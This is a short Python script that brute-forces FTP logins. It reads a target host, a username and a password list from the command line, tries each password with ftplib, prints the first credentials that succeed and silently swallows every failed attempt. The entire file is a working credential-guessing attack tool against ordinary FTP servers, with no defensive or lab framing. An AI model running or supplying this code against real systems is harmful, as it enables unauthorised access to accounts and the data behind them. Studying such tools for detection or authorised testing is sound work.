import ftplib
import argparse

parser = argparse.ArgumentParser(description='Enter Host IP Address')
parser.add_argument('Host', help='IP Address Of The Host')
parser.add_argument('UserName', help='User Name For Brute Force')
parser.add_argument('passwordfile', help='Path To The Password File')
args = parser.parse_args()
input_target = args.Host
userName = args.UserName
passwordfile = args.passwordfile
target = input_target


def bruteLogin(hostname, passwdFile):
    with open (passwdFile, 'r') as pF:
        for line in pF.readlines():
            passWord = line.strip('\r').strip('\n')
            try:
                ftp = ftplib.FTP(hostname)
                ftp.login(userName, passWord)
                print(f"FTP Logon Succeded For Host: {hostname} Username: {userName} Password: {passWord}")
                ftp.quit()
                return(userName, passWord)
            except:
                pass
        print(f"Could Not Brute Force Credentials For Host: {hostname}")

bruteLogin(target, passwordfile)


